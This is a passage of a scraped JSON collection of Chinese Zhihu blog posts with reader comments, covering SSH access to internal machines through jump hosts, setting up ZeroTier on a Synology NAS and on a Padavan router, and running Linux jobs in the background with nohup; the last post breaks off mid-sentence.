            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 4, 
            "title": "SSH 通过跳板机直接访问内网机器", 
            "content": "<p>本文博客地址：</p><a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/07/18/ssh-proxyjump/\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-e830063a21cdacda8ccf6404189fc32d_ipico.jpg\" data-image-width=\"418\" data-image-height=\"418\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">SSH 通过跳板机直接访问内网机器</a><p>本文公众号地址：</p><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/jUYMulyl0xoPp-Vi3QJ3-Q\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-f4bc0c05d4cfb3d7cd338490cf713b3f_180x120.jpg\" data-image-width=\"1280\" data-image-height=\"542\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">SSH 通过跳板机直接访问内网机器</a><h2>前言<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/07/18/ssh-proxyjump/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">SSH 通过跳板机直接访问内网机器</a>前言</h2><p>公司的很多服务器没有外网地址只能通过内网访问。</p><p>这个时候就需要我们先登录跳板机，然后在跳板机上登录内网机器（本机 ssh -&gt; 跳板机 -&gt; 内网机器）。</p><p>因为跳板机是公用的，所以为了安全不能将跳板机的公钥放到内网机器上实现免密登录，更不能将本机的公钥和私钥放到跳板机上实现免密登录。因为懒所以就搜寻到一个解决方案。</p><p>Ps:懒人改变世界: )</p><h2>正文</h2><h2>ProxyJump</h2><p>需要 <code>OpenSSH 7.3</code> 以上版本才可以使用 <code>ProxyJump</code>, 使用下列命令查看<code>OpenSSH</code> 版本：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ ssh -V</code></pre></div><p><code>ProxyJump</code> 命令行使用方法：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh -J <span class=\"o\">[</span>email protected<span class=\"o\">]</span>:port1,<span class=\"o\">[</span>email protected<span class=\"o\">]</span>:port2</code></pre></div><p>可以直接使用上述命令通过跳板机直接登录内网机器，比如：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh username@目标机器IP -p <span class=\"m\">22</span> -J username@跳板机IP:22</code></pre></div><p>如果需要通过多个跳板机则以 <code>,</code> 分割：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh username@目标机器IP -p <span class=\"m\">22</span> -J username1@跳板机IP1:22,username2@跳板机IP2:22</code></pre></div><p>如果你觉得每次都需要加上 <code>-J</code> 的配置很多麻烦，可以写到配置文件里。修改配置文件 <code>~\\.ssh\\config</code>，默认没有需要自己创建。增加以下内容：</p><div class=\"highlight\"><pre><code class=\"language-bash\">Host target    <span class=\"c1\"># 代表目标机器的名字</span>\n    HostName 目标机器 IP    <span class=\"c1\"># 这个是目标机器的 IP</span>\n    Port <span class=\"m\">22</span>    <span class=\"c1\"># 目标机器 ssh 的端口</span>\n    User username_target    <span class=\"c1\"># 目标机器的用户名</span>\n    ProxyJump username@跳板机IP:port\n\nHost <span class=\"m\">10</span>.10.0.*    <span class=\"c1\"># 使用通配符 * 代表 10.10.0.1 - 10.10.0.255</span>\n    Port <span class=\"m\">22</span>    <span class=\"c1\"># 服务器端口</span>\n    User username    <span class=\"c1\"># 服务器用户名</span>\n    ProxyJump username@跳板机IP:port</code></pre></div><p>也可以为跳板机器一个“别名”方便使用：</p><div class=\"highlight\"><pre><code class=\"language-bash\">Host tiaoban1    <span class=\"c1\"># 代表跳板机 1</span>\n    HostName 跳板机 <span class=\"m\">1</span> 的 IP\n    Port <span class=\"m\">22</span>    <span class=\"c1\"># ssh 连接端口</span>\n    User username1    <span class=\"c1\"># 跳板机 1 的用户名</span>\n\nHost tiaoban2    <span class=\"c1\"># 代表跳板机 2</span>\n    HostName 跳板机 <span class=\"m\">2</span> 的 IP\n    Port <span class=\"m\">22</span>    <span class=\"c1\"># ssh 连接端口</span>\n    User username2    <span class=\"c1\"># 跳板机 2 的用户名</span>\n\nHost target    <span class=\"c1\"># 代表目标机器的名字</span>\n    HostName 目标机器 IP    <span class=\"c1\"># 这个是目标机器的 IP</span>\n    Port <span class=\"m\">22</span>    <span class=\"c1\"># 目标机器 ssh 的端口</span>\n    User username_target    <span class=\"c1\"># 目标机器的用户名</span>\n    ProxyJump tiaoban1,tiaoban2\n\nHost <span class=\"m\">10</span>.10.0.*    <span class=\"c1\"># 使用通配符 * 代表 10.10.0.1 - 10.10.0.255</span>\n    Port <span class=\"m\">22</span>    <span class=\"c1\"># 服务器端口</span>\n    User username    <span class=\"c1\"># 服务器用户名</span>\n    ProxyJump tiaoban1,tiaoban2</code></pre></div><p>使用方法：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh target\nssh <span class=\"m\">10</span>.10.0.1\nssh username@target -p22\nssh username@10.10.0.1 -p22</code></pre></div><h2>ProxyCommand</h2><p>如果 <code>OpenSSH</code> 版本低于 <b>7.3</b> 可以使用 <code>ProxyCommand</code>达到同样的效果。</p><p><code>ProxyCommand</code> 命令行使用方法：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh username@目标机器IP -p <span class=\"m\">22</span> -o <span class=\"nv\">ProxyCommand</span><span class=\"o\">=</span><span class=\"s1\">&#39;ssh -p 22 username@跳板机IP -W %h:%p&#39;</span></code></pre></div><p>同样可以在 <code>~/.ssh/config</code> 文件中增加配置文件：</p><div class=\"highlight\"><pre><code class=\"language-bash\">Host tiaoban   <span class=\"c1\"># 任意名字，随便使用</span>\n\n    HostName 跳板机的 IP，支持域名\n\n    Port <span class=\"m\">22</span>      <span class=\"c1\"># 跳板机端口</span>\n\n    User username_tiaoban       <span class=\"c1\"># 跳板机用户</span>\n\n \n\nHost target      <span class=\"c1\"># 同样，任意名字，随便起</span>\n\n    HostName 目标服务器 IP    <span class=\"c1\"># 真正登陆的服务器，不支持域名必须IP地址</span>\n\n    Port <span class=\"m\">22</span>   <span class=\"c1\"># 服务器的端口</span>\n\n    User username   <span class=\"c1\"># 服务器的用户</span>\n\n    ProxyCommand ssh tiaoban -W %h:%p\n\n\n\nHost <span class=\"m\">10</span>.10.0.*      <span class=\"c1\"># 可以用*通配符</span>\n\n    Port <span class=\"m\">22</span>   <span class=\"c1\"># 服务器的端口</span>\n\n    User username   <span class=\"c1\"># 服务器的用户</span>\n\n    ProxyCommand ssh tiaoban -W %h:%p</code></pre></div><p>使用方法同上：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh target\nssh <span class=\"m\">10</span>.10.0.1\nssh username@target -p22\nssh username@10.10.0.1 -p22</code></pre></div><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//my.oschina.net/foreverich/blog/657075\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ssh如何通过跳板机直接访问到后端服务器(Mac&amp;Linux&amp;Windows解决方案)</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//netsecurity.51cto.com/art/201711/557999.htm\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">SSH命令行帮你实现六种“贴心”的安全应用</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.lzskyline.com/archives/478\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[转]SSH隧道：内网穿透实战</a></li></ol>", 
            "topic": [
                {
                    "tag": "SSH(Secure Shell)", 
                    "tagLink": "https://api.zhihu.com/topics/19557973"
                }, 
                {
                    "tag": "SSH Server", 
                    "tagLink": "https://api.zhihu.com/topics/20050963"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/73558450", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 11, 
            "title": "群晖 Synology 安装 ZeroTier", 
            "content": "<blockquote>前言</blockquote><p>最近购买了一台蜗牛星际矿难机器，自己安装了黑群晖，记录一下群晖安装 ZeroTier 远程访问的过程。</p><h2>正文</h2><h2>下载安装包</h2><p>在 ZeroTier 官网下载群晖专用安装包：<a href=\"https://link.zhihu.com/?target=https%3A//download.zerotier.com/dist/synology/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">download.zerotier.com/d</span><span class=\"invisible\">ist/synology/</span><span class=\"ellipsis\"></span></a></p><p>请根据自己的电脑 CPU 选择相应的安装包，蜗牛星际 C 款是：<a href=\"https://link.zhihu.com/?target=https%3A//download.zerotier.com/dist/synology/zerotier-1.2.12r1-syn-x64-6.1.spk\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">zerotier-1.2.12r1-syn-x64-6.1.spk</a></p><p><b>请安装解决了重启不能自启 bug 的最新版</b></p><h2>安装 ZeroTier</h2><p>进入群晖的套件中心，选择手动安装进行安装。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-aaaac76a0b0fe6a0f4df8fe82281fcdb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2120\" data-rawheight=\"1140\" class=\"origin_image zh-lightbox-thumb\" width=\"2120\" data-original=\"https://pic4.zhimg.com/v2-aaaac76a0b0fe6a0f4df8fe82281fcdb_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2120&#39; height=&#39;1140&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2120\" data-rawheight=\"1140\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2120\" data-original=\"https://pic4.zhimg.com/v2-aaaac76a0b0fe6a0f4df8fe82281fcdb_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-aaaac76a0b0fe6a0f4df8fe82281fcdb_b.jpg\"/></figure><h2>加入 ZeroTier 网络</h2><p>在套件中心打开安装好后的 ZeroTier，计入已经创建好的 ZeroTier 网络。ZeroTier 网络的创建请参考：<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/07/07/zerotier-one-start/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">P2P 内网穿透工具 ZeroTier</a></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-e9bcc628ff4455e4c917f89642ba251f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2360\" data-rawheight=\"1140\" class=\"origin_image zh-lightbox-thumb\" width=\"2360\" data-original=\"https://pic4.zhimg.com/v2-e9bcc628ff4455e4c917f89642ba251f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2360&#39; height=&#39;1140&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2360\" data-rawheight=\"1140\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2360\" data-original=\"https://pic4.zhimg.com/v2-e9bcc628ff4455e4c917f89642ba251f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-e9bcc628ff4455e4c917f89642ba251f_b.jpg\"/></figure><h2>修复开机自启 BUG</h2><p>重启后 ZeroTier 的虚拟网卡不能够加载成功，外届无法连通 群晖，只能群晖连接 ZeroTier 网络用户中的其他用户。</p><p>进入群晖的 Shell 环境运行下列命令：</p><div class=\"highlight\"><pre><code class=\"language-text\">cat &lt;&lt;EOF &gt; /usr/local/etc/rc.d/tun.sh\n#!/bin/sh -e\n\ninsmod /lib/modules/tun.ko\nEOF</code></pre></div><p>修改文件运行权限：</p><div class=\"highlight\"><pre><code class=\"language-text\">chmod a+x /usr/local/etc/rc.d/tun.sh</code></pre></div><p>根据 <a href=\"https://link.zhihu.com/?target=https%3A//github.com/zerotier/ZeroTierNAS/issues/28\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/zerotier/Zer</span><span class=\"invisible\">oTierNAS/issues/28</span><span class=\"ellipsis\"></span></a> 最新版（1.4.0）已经解决了重启不能启动的 BUG。</p><blockquote>Hey everyone, my apologies for taking so long on this. Here&#39;s an updated set of packages to preview 1.4.0. It addresses the following issues:<br/><br/>Losing interface on reboot: insmod /lib/modules/tun.ko issued upon each reboot (and start of the service). See tickets #41 and #43<br/>Identity files moved to more traditional location /var/lib/zerotier-one, and are now preserved across uninstalls, reinstalls, updates, etc. Prior to this version, during uninstall we were intentionally deleting your identity files just for thoroughness but this seems to be annoying to most users (rightly so). So uninstalling and updating to this version is the last time that your configuration will get wiped. See tickets #41<br/>Service script now sends proper SIGKILL signal<br/>Segfault on ARM (might be fixed), see ticket #52 -Memory leak (might be fixed), see ticket #46<br/>To view logs for this package, see: /var/log/packages/zerotier.log</blockquote><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/zerotier/ZeroTierNAS/issues/28\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Synology Nas&#39;es lose virtual interface address after reboot.</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//ruimarinho.github.io/post/fix-tun-tap-not-available-on-a-synology-nas/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Fix TUN/TAP not available on a Synology NAS</a></li></ol>", 
            "topic": [
                {
                    "tag": "群晖", 
                    "tagLink": "https://api.zhihu.com/topics/19827077"
                }, 
                {
                    "tag": "家用 NAS", 
                    "tagLink": "https://api.zhihu.com/topics/19736752"
                }
            ], 
            "comments": [
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "我也在用zero tier。希望能简单介绍一下穿透原理，性能瓶颈和安全性。", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "安全性方面我最近也在看，性能瓶颈的话如果只用官方的节点丢包率很大，可以自己搭建私有节点提高稳定性", 
                            "likes": 0, 
                            "replyToAuthor": "知乎用户"
                        }, 
                        {
                            "userName": "知乎用户", 
                            "userLink": "https://www.zhihu.com/people/0", 
                            "content": "谢谢。私有节点你研究透了一定要分享呀", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }, 
                {
                    "userName": "杨雷", 
                    "userLink": "https://www.zhihu.com/people/4ddc4e9388972155a27a2be75d1e35d3", 
                    "content": "请问 你的cpu是哪款？我的j3455然后装的apoll版本不成功。不知道是不是装错版本了", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "一个一个试试，就那么多安装包😄", 
                            "likes": 0, 
                            "replyToAuthor": "杨雷"
                        }
                    ]
                }, 
                {
                    "userName": "特聊", 
                    "userLink": "https://www.zhihu.com/people/f30370407b88572dec475bbbba028e26", 
                    "content": "你好能不能问一下具体怎么操作..我本来已经测试好了，换了个网络环境，现在zero tier 一直是offline连不上了", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "尝试卸载重新装一下", 
                            "likes": 0, 
                            "replyToAuthor": "特聊"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "你好楼主，在群晖安装完点join没反应，重新安装后套件界面都不出来了。该如何处理？", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "黄大仙", 
                    "userLink": "https://www.zhihu.com/people/2ea72a41e340a1bbe0727e89176784be", 
                    "content": "速度岌慢", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/73552123", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 3, 
            "title": "老毛子 Padavan  路由器安装 ZeroTier", 
            "content": "<h2>前言</h2><p>家里的 Newifi mini 路由器安装了老毛子 Padavan 系统。本文将介绍 Padavan 如何安装 ZeroTier，从而可以远程连接家中的路由器。</p><h2>介绍</h2><p>什么是老毛子改 Padavan 固件，老毛子即是对老外（一般指俄罗斯人）的统称，就是说国外的大牛基于某些开源项目比如基于华硕开源的衍生出来的系列 Padavan 系统。</p><h2>Entware</h2><h2>介绍</h2><p>Entware 是一个适用于嵌入式系统的软件包库，使用 opkg 包管理系统进行管理，官方源上有超过 2000 个软件包。</p><p>官方地址：<a href=\"https://link.zhihu.com/?target=https%3A//entware.net/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Entware</a></p><h2>安装</h2><h3>新建 opt 文件夹</h3><p>在电脑上格式化的 U 盘为 ext4 格式，<b>在格式化后的 U 盘根目录新建一个</b> <b><code>opt</code></b> <b>文件夹</b>。（<b><i>Ps: 此步骤很重要！！！</i></b>）</p><h3>开启 Entware</h3><p>将格式化后的 U 盘插入路由器，并进入路由器管理页面：<a href=\"https://link.zhihu.com/?target=http%3A//192.168.123.1/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">192.168.123.1</a></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-a728aaebbfffd2a8265e26e6abc976b5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2318\" data-rawheight=\"1316\" class=\"origin_image zh-lightbox-thumb\" width=\"2318\" data-original=\"https://pic2.zhimg.com/v2-a728aaebbfffd2a8265e26e6abc976b5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2318&#39; height=&#39;1316&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2318\" data-rawheight=\"1316\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2318\" data-original=\"https://pic2.zhimg.com/v2-a728aaebbfffd2a8265e26e6abc976b5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-a728aaebbfffd2a8265e26e6abc976b5_b.jpg\"/></figure><h2>查看是否成功挂载 /opt</h2><p>进入路由器 Shell，密码为路由器登录页面的密码：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ssh admin@192.168.123.1</code></pre></div><p>输入 df -h，如果出现 <code>Mount on</code> 一栏下面出现 <code>/opt</code> 则挂载成功。</p><p>如果 opt 没挂载，说明没安装上，请查看 <code>opt</code> 文件夹是否创建正确，注意文件名为小写。</p><h2>安装 okpg</h2><p>进入 Shell 后，在根目录下输入：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ opkg.sh</code></pre></div><p>等待安装完成后，升级：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ opkg update</code></pre></div><h2>安装 ZeroTier</h2><p>进入 Shell，输入下列命令进行安装：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ opkg install zerotier</code></pre></div><p>启动 ZertoTier:</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ zerotier-one -d</code></pre></div><p>加入自己的 ZeroTier 网络：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ zerotier-cli join xxxxx<span class=\"o\">(</span>自己的网络 ID<span class=\"o\">)</span></code></pre></div><p>ZeroTier 网络创建请参考：<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/07/07/zerotier-one-start/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">P2P 内网穿透工具 ZeroTier</a></p><h2>调整防火墙</h2><p>需要允许 ZeroTier 创建的虚拟网卡的流量进入，首先查看你自己的虚拟网卡名称：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ ifconfig</code></pre></div><p>在命令行输入上述命令后找到你的 ZeroTier 创建的虚拟网卡：</p><div class=\"highlight\"><pre><code class=\"language-bash\">...\nztwfuekerg Link encap:Ethernet  HWaddr A6:84:2F:1B:6F:5C\n          inet addr:10.121.12.5  Bcast:10.121.12.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:2800  Metric:1\n          RX packets:469 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:392 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:500\n          RX bytes:42064 <span class=\"o\">(</span><span class=\"m\">41</span>.0 KiB<span class=\"o\">)</span>  TX bytes:38080 <span class=\"o\">(</span><span class=\"m\">37</span>.1 KiB<span class=\"o\">)</span>\n...</code></pre></div><p>我的虚拟网卡名即为: <code>ztwfuekerg</code></p><p>设置防火墙：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ iptables -A INPUT  -i ztwfuekerg -j ACCEPT</code></pre></div><p>杀死当前 ZeroTier:</p><div class=\"highlight\"><pre><code class=\"language-bash\">ps -wlT <span class=\"p\">|</span> grep <span class=\"s2\">&#34;zerotier-one -d&#34;</span> <span class=\"p\">|</span> grep -v grep <span class=\"p\">|</span> awk <span class=\"s1\">&#39;{print $3}&#39;</span> <span class=\"p\">|</span> xargs <span class=\"nb\">kill</span> -9</code></pre></div><p>重新启动：</p><div class=\"highlight\"><pre><code class=\"language-bash\">zerotier-one -d</code></pre></div><h2>设置 ZeroTier 开机自启</h2><p>进入路由器后台，在自定义设置的脚本中选择自定义脚本加入下面命令并点击应用本页面设置：</p><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"c1\"># 启动 zerotier</span>\niptables -A INPUT  -i ztwfuekerg -j ACCEPT\n\nzerotier-one -d</code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-4fa94fd657f46971dbaaad2cb3bc287a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1888\" data-rawheight=\"1096\" class=\"origin_image zh-lightbox-thumb\" width=\"1888\" data-original=\"https://pic3.zhimg.com/v2-4fa94fd657f46971dbaaad2cb3bc287a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1888&#39; height=&#39;1096&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1888\" data-rawheight=\"1096\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1888\" data-original=\"https://pic3.zhimg.com/v2-4fa94fd657f46971dbaaad2cb3bc287a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-4fa94fd657f46971dbaaad2cb3bc287a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//www.right.com.cn/forum/forum.php%3Fmod%3Dviewthread%26tid%3D367080\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">关于Padavan下的zerotier内网穿透设置</a></li></ol>", 
            "topic": [
                {
                    "tag": "OpenWrt", 
                    "tagLink": "https://api.zhihu.com/topics/19653984"
                }
            ], 
            "comments": [
                {
                    "userName": "耗儿", 
                    "userLink": "https://www.zhihu.com/people/8827da593b79455da3e0bf6438204b05", 
                    "content": "首赞，有空照着教程来试试😆", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "好东西", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "牛博恩", 
                    "userLink": "https://www.zhihu.com/people/c0fe981b7050ad2d41312933ec81bb81", 
                    "content": "<p>这个相比wireguard要好使吗？</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "走马观花", 
                    "userLink": "https://www.zhihu.com/people/cd9db4a55f352a8093749dfa1a532259", 
                    "content": "pandorabox添加源就搞定了，这个，太麻烦", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/72839253", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "关于 ZeroTier 的那篇文章", 
            "content": "<p>借某位知友评论&#34;吉言&#34;已被和谐: )</p><p>想看的朋友请移步博客: <a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/07/07/zerotier-one-start/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">woodenrobot.me/2019/07/</span><span class=\"invisible\">07/zerotier-one-start/</span><span class=\"ellipsis\"></span></a></p><p>或者公众号：<a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/KK8_uZggLQWAGCJu5-9kPQ\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">mp.weixin.qq.com/s/KK8_</span><span class=\"invisible\">uZggLQWAGCJu5-9kPQ</span><span class=\"ellipsis\"></span></a></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-2d4956c3cac8173125bd576c9bb4a04b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1258\" data-rawheight=\"1128\" class=\"origin_image zh-lightbox-thumb\" width=\"1258\" data-original=\"https://pic4.zhimg.com/v2-2d4956c3cac8173125bd576c9bb4a04b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1258&#39; height=&#39;1128&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1258\" data-rawheight=\"1128\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1258\" data-original=\"https://pic4.zhimg.com/v2-2d4956c3cac8173125bd576c9bb4a04b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-2d4956c3cac8173125bd576c9bb4a04b_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "404 页面", 
                    "tagLink": "https://api.zhihu.com/topics/19577145"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/72188284", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "Linux 后台运行任务 nohup 和 &", 
            "content": "<h2>介绍</h2><h2>nohup</h2><blockquote>用途：不挂断地运行命令。<br/>语法：nohup Command [ Arg … ] [　&amp; ]<br/>无论是否将 nohup 命令的输出重定向到终端，输出都将附加到当前目录的 nohup.out 文件中。<br/>如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中。<br/>如果没有文件能创建或打开以用于追加，那么 Command 参数指定的命令不可调用。<br/>退出状态：该命令返回下列出口值：<br/>126 可以查找但不能调用 Command 参数指定的命令。<br/>127 nohup 命令发生错误或不能查找由 Command 参数指定的命令。 否则，nohup 命令的退出状态是 Command 参数指定命令的退出状态。</blockquote><p>使用 nohup 运行程序:</p><ul><li>输出重定向，默认重定向到当前目录下 <code>nohup.out</code> 文件</li><li>使用 <code>Ctrl + C</code> 发送  <code>SIGINT</code> 信号，程序关闭</li><li>关闭 <code>Shell Session</code> 发送 <code>SIGHUP</code> 信号，程序免疫</li></ul><h2>&amp;</h2><p>使用 <code>&amp;</code> 运行程序：</p><ul><li>程序转入后台运行</li><li>结果会输出到终端</li><li>使用<code>Ctrl + C</code> 发送<code>SIGINT</code> 信号，程序免疫</li><li>关闭 <code>Shell session</code> 发送 <code>SIGHUP</code> 信号，程序关闭</li></ul><h2>使用</h2><h2>后台运行程序</h2><p>一般两个一起组合使用不会受 <code>Ctrl C</code> 和 <code>Shell</code> 关闭的影响：</p><div class=\"highlight\"><pre><code class=\"language-bash\">nohup <span class=\"nb\">command</span> <span class=\"p\">&amp;</span></code></pre></div><p>举例：</p><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"c1\"># 输出默认重定向到当前目录下 nohup.out 文件</span>\n<span class=\"m\">1</span>. nohup python main.py <span class=\"p\">&amp;</span>  \n<span class=\"c1\"># 自定义输出文件(标准输出和错误输出合并到 main.log)</span>\n<span class=\"m\">2</span>. nohup python main.py &gt;&gt; main.log <span class=\"m\">2</span>&gt;<span class=\"p\">&amp;</span><span class=\"m\">1</span> <span class=\"p\">&amp;</span> \n<span class=\"c1\"># 与上一个例子相同作用的简写方法</span>\n<span class=\"m\">3</span>. nohup python main.py <span class=\"p\">&amp;</span>&gt; main.log <span class=\"p\">&amp;</span>\n<span class=\"c1\"># 不记录输出信息</span>\n<span class=\"m\">4</span>. nohup python main.py <span class=\"p\">&amp;</span>&gt; /dev/null <span class=\"p\">&amp;</span>\n<span class=\"c1\"># 不记录输出信息并将程序的进程号写入 pidfile.txt 文件中，方便后续杀死进程</span>\n<span class=\"m\">5</span>. nohup python main.py <span class=\"p\">&amp;</span>&gt; /dev/null <span class=\"p\">&amp;</span> <span class=\"nb\">echo</span> <span class=\"nv\">$!</span> &gt; pidfile.txt</code></pre></div><h2>查看后台运行任务</h2><p>查看当前有多少在后台运行的命令：</p><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"nb\">jobs</span> -l</code></pre></div><p>选项可显示所有任务的 PID，jobs 的状态可以是 running, stopped, Terminated 。</p><p><b>注：只有在当前</b> <b><code>Shell session</code></b> <b>中可以查看后台运行的程序，退出</b> <b><code>Shell</code></b> <b>后无法在从</b> <b><code>jobs -l</code></b> 